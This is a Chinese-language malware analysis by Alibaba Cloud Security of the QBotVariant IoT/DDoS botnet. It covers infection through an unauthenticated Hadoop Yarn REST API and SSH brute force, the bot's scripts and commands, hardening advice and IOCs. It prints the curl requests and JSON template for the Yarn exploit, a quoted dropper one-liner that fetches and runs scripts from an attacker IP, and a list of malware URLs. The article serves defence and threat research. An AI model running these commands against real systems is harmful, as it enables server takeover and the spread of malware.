@@ -1,0 +1,318 @@
+## 前言
+
+ **互联网给人带来便捷的同时，其公开大量的资源也同样给恶意利用者带了便捷，越来越多公开的恶意程序源码降低了对外攻击、入侵的难度，使得安全问题愈加严重。**
+
+**阿里云安全团队从今年5月份监测到一BOT家族，其样本改写自互联网公开渠道源码，在互联网上广泛传播，造成了极大的危害，云安全团队对该类样本做了分析、聚类、溯源，在此我们将该类样本命名为QBotVariant。**
+
+## QBotVariant解构
+
+QBotVariant具有DDoS攻击、后门、下载器、暴力破解等功能，一旦被入侵便变成肉鸡，其主要传播方式通过Hadoop Yarn资源管理系统REST
+API未授权访问漏洞和基于弱口令的暴力破解。类似Mirai该BOT家族针对多个版本的操作系统，不仅服务器受到危害，如CCTV监控、家庭路由等IOT设备更容易被攻击、入侵。Radware公司Pascal
+Geenens在最新的博客《New DemonBot
+Discovered》中提及到该类样本，但是他发现的IP、样本等信息只是该类家族的其中一个样本，而我们从监测到30多个下载服务器可以看出，QBotVariant多变的IP和二进制样本变种，使其难以发现和跟踪。
+
+在云平台上，我们监测到的QBotVariant活跃度如下，峰值的时候可以达到上千个，活跃度一直未减。
+
+![活跃度](https://image.3001.net/images/20181109/1541767175_5be580076f6e9.png!small)
+
+以下我们将从传播方式、脚本分析、样本分析、溯源等多个角度对QBotVariant进行详细的分析。
+
+### 入侵、传播方式
+
+QBotVariant家族传播的方式有两种，一是利用Hadoop Yarn资源管理系统REST
+API未授权访问漏洞进行入侵，二是通过硬编码的弱密码进行SSH暴力破解。
+
+![入侵、传播方式](https://image.3001.net/images/20181109/1541767386_5be580da50c4b.png!small)
+
+Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。Hadoop
+Yarn资源管理系统配置不当导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过REST
+API部署任务来执行任意代码，最终完全控制服务器。
+
+其问题来源于对外开启了以下作用的端口
+
+> yarn.resourcemanager.webapp.address，默认端口8088
+>
+> yarn.resourcemanager.webapp.https.address，默认端口8090
+
+通过对新申请application，如下指令
+
+    
+    
+    curl -v -X POST '[http://ip:port/ws/v1/cluster/apps/new-application](http://ip/ws/v1/cluster/apps/new-application)'
+
+再执行如下指令即可完成入侵
+
+curl -s -i -X POST -H 'Accept:application/json' -H 'Content-Type:application/json'[http://ip:port/ws/v1/cluster/apps](http://ip/ws/v1/cluster/apps)
+-data-binary @example.json
+
+其example.json文件如下：
+
+    
+    
+    {
+    
+        "am-container-spec":{
+    
+            "commands":{
+    
+                "command":"执行的命令书写在这里"
+    
+            }
+    
+        },
+    
+        "application-id":"application_xxxx_xxxxx",
+    
+        "application-name":"test",
+    
+        "application-type":"YARN"
+    
+    }
+
+### 脚本分析
+
+我们通过溯源找到了QBotVariant比较原始版本的脚本，在原始版本的脚本中支持wget、tftp、ftpget等脚本的执行，从远程下载服务器下载脚本并执行：
+
+    
+    
+    bash -c cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
+    
+    wget <http://185.244.25.153/bins.sh>; chmod 777 bins.sh; sh bins.sh;
+    
+    tftp 185.244.25.153 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh;
+    
+    tftp -r tftp2.sh -g 185.244.25.153; chmod 777 tftp2.sh; sh tftp2.sh;
+    
+    ftpget -v -u anonymous -p anonymous -P 21 185.244.25.153 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
+
+以下是我们截获的一个经过改写的下载脚本，从脚本可以看出作者为了能够很好的对IOT设备支持，一方面编译了不同版本的程序，通过ntpd、sshd、openssh等进行伪装；另一方面每个命令行都加入了对busybox的支持，这些使得该类脚本很好的支持了IOT设备，为QBotVaraint的传播提供了更加便捷的途径。
+
+![更加便捷的途径](https://image.3001.net/images/20181109/1541767485_5be5813dbf796.png!small)
+
+捕获的源码中有用于编译多个版本的脚本：
+
+![编译多个版本的脚本](https://image.3001.net/images/20181109/1541767501_5be5814d54aab.png!small)
+
+QBotVariant支持版本类型及其对应二进制名称：
+
+**支持版本类型** | **对应二进制名称** | **支持版本类型** | **对应二进制名称**  
+---|---|---|---  
+mips | ntpd | i586 | ftp  
+mipsel | sshd | m68k | pftp  
+sh4 | openssh | sparc | sh  
+x86_64 | bash | armv4l |  
+armv6l | tftp | armv5l | apache2  
+i686 | wget | powerpc-440fp | telnetd  
+powerpc | cron |  |  
+  
+### 样本分析
+
+截获的多批次样本都比较相似，都改编于QBot。某些作者为了精简样本或者进行杀软对抗可能将某些功能进行裁剪，我们随机对比两个捕获的样本，如图右边的样本对getRandomPublicIP函数进行了裁剪，该样本只实现了QBot的少许功能，其文件更小、功能更加单一。
+
+![样本分析](https://image.3001.net/images/20181109/1541767544_5be58178ea6a8.png!small)
+
+而绝大部分样本都实现了基本功能，其传播性、危害性等性质并未改变，部分函数如图所示
+
+![样本分析](https://image.3001.net/images/20181109/1541767559_5be581872aa85.png!small)
+
+### 指令分析
+
+我们对远控指令进行了分析，其功能如下图所示
+
+![指令分析](https://image.3001.net/images/20181109/1541767588_5be581a41404c.png!small)
+
+值得注意是StartTheLelz函数，该函数主要用于对随机生成的IP地址进行爆破，如图通过getRandomPublicIP函数得到随机的IP，将硬编码的用户名和密码存储在结构体中，然后进行连接，其最大爆破次数通过max变量进行控制，max和文件描述表的项数有关但最大不超过4096。
+
+![指令分析](https://image.3001.net/images/20181109/1541767605_5be581b5deb78.png!small)
+
+通过数据区可以看见作者集成了几种常见的用户名和密码用于爆破：
+
+![指令分析](https://image.3001.net/images/20181109/1541767621_5be581c50f26a.png!small)
+
+如果最终爆破成功，则会在被爆破的主机中执行如下脚本，从而感染主机，再继续向外传播：
+
+![指令分析](https://image.3001.net/images/20181109/1541767637_5be581d56f1d3.png!small)
+
+除了集成常见的对外DDoS攻击方法，QBotVariant还可以进行对外发送垃圾数据，通过sendJUNK或sendUDP即可完成该动作，如图用于生成随机字符串的makeRandomStr函数，通过发送大量垃圾包同样可以造成网络带宽阻塞。
+
+![指令分析](https://image.3001.net/images/20181109/1541767658_5be581eaea9c7.png!small)
+
+而QBotVariant为了最大化入侵价值，同样提供了远程shell命令执行功能，其命令以"SH"开头，通过fdgets、sockprintf将命令执行后的结果返回到远控端，实现如下：
+
+![指令分析](https://image.3001.net/images/20181109/1541767671_5be581f72f818.png!small)
+
+### 样本溯源/同源性分析
+
+我们在对样本分析的过程中发现一个有趣的现象，样本为了逃避检测，有多种不同的指令，我们选取了几种QBotVariant的上线方式。
+
+第一种，信息较简单，返回大小端、CPU架构、主机用途等信息。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767704_5be582182fb45.png!small)
+
+第二种，信息比较全面，带有操作系统、CPU架构、主机用途、端口、主机IP等信息。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767715_5be582236ee9f.png!small)
+
+第三种，信息最为简单，只返回架构信息。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767728_5be582307f416.png!small)
+
+第四种，返回大小端、架构信息。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767738_5be5823ab3948.png!small)
+
+第五种，信息比较全面，架构信息、大小端、主机IP、主机用途等信息。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767752_5be58248913d0.png!small)
+
+第六种，返回主机IP、类型、版本信息等。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767761_5be582514eae0.png!small)
+
+第七种，返回架构、主机IP等信息。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767771_5be5825b4f971.png!small)
+
+我们在对样本进行溯源发现，在pastebin上存在大量该类样本的源码、二进制文件等，其存在时间都在数月之久，作者目录下还包括其他类型IOT蠕虫，同时发现多个作者进行了QBot的改写，如图是其中一位作者的pastebin和github。
+
+![](https://image.3001.net/images/20181109/1541767781_5be58265da807.png!small)
+
+![pastebin和github](https://image.3001.net/images/20181109/1541767790_5be5826e59edf.png!small)
+
+QBot在国内似乎大家认知不多，但是由于源码简单、客户端小、支持多种架构，从09年活跃至今一直未间断过，常被应用于远控、DDoS等客户端，在其截获的IP中，绝大部分位于北美和欧洲各地，但是云平台检测到来自国内IP的攻击源，国内安全人员应该引起重视。
+
+![样本溯源/同源性分析](https://image.3001.net/images/20181109/1541767803_5be5827b08ddf.png!small)
+
+## 安全加固
+
+### 1\. 云防火墙
+
+开启云防火墙IPS拦截模式和虚拟补丁功能，云防火墙已经支持对该类漏洞的防御和防止暴力破解功能，用户即使不及时修复也依然能够进行防御拦截。
+
+### 2\. 网络访问控制
+
+使用"ECS/VPC安全组"对"受影响服务端口"访问源IP进行控制，如果本身Hadoop环境仅对内网提供服务，请不要将Hadoop服务端口发布到互联网。
+
+### 3\. 更新升级
+
+若使用自建的Hadoop，根据实际情况及时更新补丁，Hadoop在2.X以上版本提供了安全认证功能，加入了Kerberos认证机制，建议启用Kerberos认证功能或者您可以选择使用云上的MaxCompute(8年以上"零"安全漏洞)或云上的E-MAPREDUCE服务。
+
+## 总结
+
+QBotVariant通过Hadoop Yarn资源管理系统REST
+API未授权访问漏洞、弱密码口令爆破等方式进行入侵，一旦感染此类蠕虫，不仅会占用主机计算资源消耗带宽流量，成为攻击其他主机的肉鸡，还可能造成数据泄露，数据丢失等后果。
+
+阿里云安全提醒广大互联网用户，注意第三方应用的配置，防止出现此类未授权漏洞，同时加强用户名和密码的安全意识，切实保护自身资产安全。
+
+## IOC
+
+部分MD5-文件名：
+
+**文件名** | **MD5**  
+---|---  
+185.244.25.153 |  
+YSDKOP.arm4 | cc9de0d789efc8636946b4b41f374dfc  
+YSDKOP.arm5 | ac94604edfe7730ccf70d5cd75610d01  
+YSDKOP.arm6 | dcb51c5abd234a41ee0439183f53fd2d  
+YSDKOP.arm7 | 2416380b2fe0c693fd7c26a91b4cb8ee  
+YSDKOP.i586 | 2f029723c778f15e8e825976c66e45cd  
+YSDKOP.i686 | 49ec48d3afdddb098fa2c857fc63c848  
+YSDKOP.m68k | 7efef839902ca20431d58685d9075710  
+YSDKOP.mips | eab0810535b45fa1bf0f6243dafb0373  
+YSDKOP.mpsl | a2c4e09821be6a4594e88376b9c30b5d  
+YSDKOP.ppc | 1fc61114722f301065cd9673025ce5e0  
+YSDKOP.sh4 | 38abc827e67ff53d0814979b435e2c40  
+YSDKOP.sparc | 20a38aeeffba9f0f1635c7b4b78f3727  
+YSDKOP.x86 | 8fd97d622e69b69a3331ee5ed08e71b2  
+188.166.125.19 |  
+| 7e9c49b9e743bcf7b382fa000c27b49d  
+apache2 | 64394fb25494b0cadf6062a0516f7c1a  
+bash | 75e7ce8c110bb132d3897b293d42116a  
+cron | e8dfae1fe29183548503dc0270878e52  
+ftp | 0e765d00f0ee174e79c81c9db812e3a2  
+ntpd | 2cb932dcb5db84dafa8cdc6b4afa52d0  
+openssh | 606a3169f099b0f2423c63b4ed3f9414  
+pftp | 6666ef216ce7434927338137760f4ab0  
+sh | cc2e82ffbc6d5053efade4849c13099f  
+sshd | 00b0a6516986aca277d0148c7ddf38c4  
+tftp | 38b075ee960d08e96b2e77205ec017de  
+wget | 58c5e1bc66ac6b364639bce4b3f76c58  
+  
+部分IP：
+
+178.128.194.222 | 178.128.7.76  
+---|---  
+103.214.111.122 | 130.185.250.199  
+194.182.80.200 | 138.197.74.100  
+198.199.84.119 | 104.248.165.108  
+178.128.46.254 | 159.65.227.17  
+206.189.196.216 | 80.211.109.66  
+194.48.152.114 | 159.89.114.171  
+178.128.43.104 | 185.244.25.153  
+209.97.159.10 | 46.36.37.121  
+46.29.164.242 | 46.17.47.250  
+158.69.60.239 | 195.181.223.138  
+80.211.39.186 | 188.166.125.19  
+104.248.112.122 | 212.237.26.71  
+178.128.239.252 | 104.248.212.127  
+104.248.63.168 |  
+  
+部分URL及出现时间：
+
+**URL** | **时间**  
+---|---  
+<http://138.197.74.100/bins.sh> | 20180904  
+<http://80.211.39.186/bins.sh> | 20180904  
+<http://178.128.239.252/bins.sh> | 20180908  
+<http://158.69.60.239/bins/boti586final> | 20180908  
+<http://158.69.60.239/bins/botx86_64final> | 20180908  
+<http://158.69.60.239/bins/boti686final> | 20180908  
+<http://158.69.60.239/bins.sh> | 20180908  
+<http://178.128.239.252/bins.sh> | 20180909  
+<http://130.185.250.199/bins.sh> | 20180909  
+<http://46.17.47.250/xm2bash> | 20180913  
+<http://104.248.112.122/Kuso69/Akiru.x86> | 20180918  
+<http://194.182.80.200/bins.sh> | 20180919  
+<http://104.248.112.122/Kuso69/Akiru.x86> | 20180919  
+<http://209.97.159.10/bins.sh> | 20181003  
+<http://46.17.47.250/xm2wget> | 20181005  
+<http://185.244.25.153/bins.sh> | 20181009  
+<http://159.65.227.17/bins.sh> | 20181009  
+<http://178.128.7.76/bins.sh> | 20181010  
+<http://185.244.25.153/bins.sh> | 20181010  
+<http://104.248.212.127/bins.sh> | 20181010  
+<http://159.65.227.17/bins.sh> | 20181010  
+<http://206.189.196.216/bins.sh> | 20181010  
+<http://188.166.125.19/bins.sh> | 20181010  
+<http://188.166.125.19/bins.sh> | 20181011  
+<http://185.244.25.153/bins.sh> | 20181011  
+<http://178.128.7.76/bins.sh> | 20181011  
+<http://104.248.212.127/bins.sh> | 20181011  
+<http://80.211.109.66/bins.sh> | 20181012  
+<http://185.244.25.153/bins.sh> | 20181012  
+<http://195.181.223.138/bins.sh> | 20181012  
+<http://159.89.114.171/bins.sh> | 20181012  
+<http://178.128.7.76/bins.sh> | 20181012  
+<http://104.248.212.127/bins.sh> | 20181012  
+<http://185.244.25.153/bins.sh> | 20181015  
+<http://104.248.165.108/bins.sh> | 20181018  
+<http://198.199.84.119/bins.sh> | 20181018  
+<http://103.214.111.122/bins.sh> | 20181019  
+<http://178.128.46.254/bins.sh> | 20181019  
+<http://178.128.43.104/bins.sh> | 20181019  
+<http://104.248.63.168/vvglma> | 20181021  
+<http://178.128.194.222/bins.sh> | 20181026  
+<http://178.128.194.222/bins.sh> | 20181027  
+<http://178.128.194.222/bins.sh> | 20181028  
+<http://46.29.164.242/bins.sh> | 20181031  
+<http://194.48.152.114/bins.sh> | 20181101  
+<http://46.36.37.121/weed.sh> | 20181103  
+  
+## 参考链接
+
+> <https://help.aliyun.com/knowledge_detail/71609.html>
+>
+> <https://blog.radware.com/security/2018/10/new-demonbot-discovered/>
+
+***本文作者：阿里云安全，转载请注明来自FreeBuf.COM**
+
